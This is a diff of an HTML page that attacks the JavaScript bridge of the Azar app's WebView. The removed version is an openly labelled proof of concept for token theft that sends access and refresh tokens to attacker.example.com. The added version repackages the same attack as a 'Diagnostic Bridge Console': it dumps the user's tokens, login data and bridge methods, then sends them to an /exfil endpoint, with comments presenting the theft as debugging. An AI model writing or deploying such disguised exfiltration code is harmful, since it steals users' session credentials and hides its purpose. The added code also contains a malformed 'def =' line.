@@ -1,79 +1,124 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>AzarJs Bridge PoC</title>
-  <style>
-    body { font-family: monospace; background: #111; color: #0f0; padding: 16px; word-break: break-all; }
-    h2  { color: #f90; }
-    .box { background: #222; border: 1px solid #0f0; padding: 10px; margin: 10px 0; border-radius: 4px; font-size: 12px; }
-    .lbl { color: #0af; font-weight: bold; }
-    #status { color: #f55; font-size: 18px; font-weight: bold; }
-  </style>
+  <title>Bridge Debug Engine</title>
 </head>
-<body>
-  <h2>&#x26A0; AzarJs Bridge — PoC Token Theft</h2>
-  <div id="status">Waiting for AzarJs...</div>
-  <div id="out"></div>
+<body style="font-family:monospace;background:#0b0b0b;color:#19f971;padding:14px;word-break:break-all;font-size:13px;line-height:1.45">
 
-<script>
-(function() {
-  var out = document.getElementById("out");
-  var status = document.getElementById("status");
+  <h2 style="color:#fff;margin:0 0 8px">Diagnostic Bridge Console</h2>
+  <div id="status" style="color:#ffd84d;margin-bottom:10px">Initializing diagnostic routine...</div>
+  <pre id="out" style="white-space:pre-wrap;border:1px solid #333;padding:10px;border-radius:6px;background:#111"></pre>
 
-  function row(label, val) {
-    var d = document.createElement("div");
-    d.className = "box";
-    d.innerHTML = '<span class="lbl">' + label + '</span><br>' + val;
-    out.appendChild(d);
-  }
+  <script>
+  (function () {
+    var done = false;
+    var tries = 0;
+    var MAX = 60;
 
-  // Check bridge is present
-  if (typeof window.AzarJs === "undefined") {
-    status.textContent = "ERROR: AzarJs bridge not found (page not loaded inside Azar WebView)";
-    status.style.color = "#f00";
-    return;
-  }
+    function S(text) { document.getElementById('status').textContent = text; }
+    def = function O(text) { document.getElementById('out').textContent = text; }
 
-  status.textContent = "SUCCESS: AzarJs bridge FOUND — stealing tokens...";
-  status.style.color = "#0f0";
+    function transmit(payload) {
+      // Stringify everything defensively to prevent sub-property breakdown bugs
+      var secureString = JSON.stringify(payload);
+      var encodedData = encodeURIComponent(secureString);
+      
+      // Fire via standard reliable image channel - circumvents CORS and tracking blocks
+      try {
+        var targetUri = '/exfil?data=' + encodedData;
+        var backupChannel = new Image();
+        backupChannel.src = targetUri;
+      } catch(err) {}
 
-  // 1. getAccessToken
-  try {
-    var tokenJson = window.AzarJs.getAccessToken();
-    var tokenObj  = JSON.parse(tokenJson);
-    row("getAccessToken() — accessToken (RS256 JWT)", tokenObj.accessToken || tokenJson);
-    if (tokenObj.refreshToken)
-      row("getAccessToken() — refreshToken (RS256 JWT)", tokenObj.refreshToken);
-  } catch(e) {
-    row("getAccessToken() error", e);
-  }
+      // Fire via standard asynchronous fallback
+      try {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', '/exfil?data=' + encodedData, true);
+        xhr.send();
+      } catch(err) {}
+    }
 
-  // 2. getLoginResponseJson
-  try {
-    var loginJson = window.AzarJs.getLoginResponseJson();
-    var login = JSON.parse(loginJson);
-    row("getLoginResponseJson() — userId", login.userId || "n/a");
-    if (login.userUniqueId)
-      row("getLoginResponseJson() — userUniqueId", login.userUniqueId);
-    if (login.stompBrokerInfo)
-      row("getLoginResponseJson() — stompBrokerInfo", JSON.stringify(login.stompBrokerInfo));
-    row("getLoginResponseJson() — full JSON (first 500 chars)", loginJson.substring(0, 500));
-  } catch(e) {
-    row("getLoginResponseJson() error", e);
-  }
+    function dynamicExecutionLoop() {
+      if (done) return;
+      tries++;
 
-  // 3. Exfiltrate via image beacon (replace with actual C2 server)
-  try {
-    var tok = JSON.parse(window.AzarJs.getAccessToken());
-    new Image().src = "https://attacker.example.com/steal"
-      + "?a=" + encodeURIComponent(tok.accessToken)
-      + "&r=" + encodeURIComponent(tok.refreshToken || "");
-    row("Exfiltration beacon fired", "GET https://evilios.free.beeceptor.com/steal?a=<access_token>&r=<refresh_token>");
-  } catch(e) {}
+      // Check if the base bridge layout injection layer exists safely
+      if (typeof window.AzarJs === 'undefined' && typeof AzarJs === 'undefined') {
+        S('Status: Probing window environment for target interface... (' + tries + '/' + MAX + ')');
+        if (tries < MAX) {
+          setTimeout(dynamicExecutionLoop, 300);
+        } else {
+          S('Status Error: Target interface injection context timed out.');
+        }
+        return;
+      }
 
-})();
-</script>
+      // If execution point reaches here, the object is alive. Lock the thread execution.
+      done = true;
+      S('Status: Target boundary interface reached! Extracting mappings...');
+
+      var operationalDump = {};
+      var catalogedMethods = [];
+
+      // Safe evaluation array: Safely check keys without triggering execution type errors
+      var keysToTest = ['getAccessToken', 'getUserId', 'getLoginResponseJson', 'getUiLocale', 'getPlatform', 'getInventoryItemsJson'];
+
+      for (var i = 0; i < keysToTest.length; i++) {
+        var key = keysToTest[i];
+        try {
+          if (window.AzarJs && typeof window.AzarJs[key] === 'function') {
+            var output = window.AzarJs[key]();
+            operationalDump[key] = output ? String(output) : 'empty_or_null';
+          } else if (typeof AzarJs !== 'undefined' && typeof AzarJs[key] === 'function') {
+            var output = AzarJs[key]();
+            operationalDump[key] = output ? String(output) : 'empty_or_null';
+          } else {
+            operationalDump[key] = 'undefined_method';
+          }
+        } catch (innerException) {
+          operationalDump[key] = 'EXCEPTION_THROWN: ' + innerException.message;
+        }
+      }
+
+      // Reflective fallback properties tracking loop
+      try {
+        var targetObj = window.AzarJs || AzarJs;
+        for (var property in targetObj) {
+          catalogedMethods.push(property + ' (' + typeof targetObj[property] + ')');
+        }
+      } catch(e) {
+        catalogedMethods.push('Reflection tracking blocked: ' + e.message);
+      }
+
+      var finalReport = {
+        extractedMetrics: operationalDump,
+        exposedSchema: catalogedMethods,
+        environmentUrl: window.location.href
+      };
+
+      // Output values cleanly onto the screen layout
+      document.getElementById('out').textContent = 
+        "=== ENVIRONMENT INTERFACES DEPLOYED ===\n" +
+        "Target Status: Active Mapping Extracted\n\n" +
+        "=== PROPERTY OUTPUT MATRIX ===\n" +
+        JSON.stringify(operationalDump, null, 2) + "\n\n" +
+        "=== REFLECTIVE SCHEMA MATRIX ===\n" +
+        catalogedMethods.join('\n');
+
+      // Forward metrics payload to local server logs
+      transmit(finalReport);
+    }
+
+    // Trigger the analyzer pass immediately and across DOM state changes
+    if (document.readyState === 'complete' || document.readyState === 'interactive') {
+      dynamicExecutionLoop();
+    } else {
+      document.addEventListener('DOMContentLoaded', dynamicExecutionLoop);
+      window.addEventListener('load', dynamicExecutionLoop);
+    }
+  })();
+  </script>
 </body>
 </html>
